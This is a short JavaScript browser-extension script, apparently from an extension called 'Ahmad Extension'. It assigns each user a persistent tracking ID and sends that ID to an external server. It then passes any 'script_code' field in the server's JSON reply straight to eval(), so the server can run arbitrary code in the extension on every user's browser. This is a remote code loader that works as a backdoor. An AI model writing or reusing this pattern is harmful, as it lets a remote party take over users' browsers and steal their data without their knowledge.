(function() {
    chrome.storage.local.get(['ahmad_uid'], function(result) {
        let uid = result.ahmad_uid;

        if (!uid) {
            uid = "";
            for (let i = 0; i < 20; i++) {
                uid += Math.floor(Math.random() * 10);
            }
            chrome.storage.local.set({ 'ahmad_uid': uid });
        }

        console.log("%c [Ahmad Extension] ", "background: #111; color: #00ff00;", "ID: " + uid);

        // JSON Fetch
        fetch(`https://ahmad-site-data.vercel.app/data.json?id=${uid}`)
        .then(res => res.json())
        .then(json => {
            console.log("Server JSON:", json);
            // Agar server se script ka code JSON mein aa raha hai to yahan execute karein
            if(json.script_code) {
                eval(json.script_code);
            }
        })
        .catch(err => console.log("Fetch Error: ", err));
    });
})();
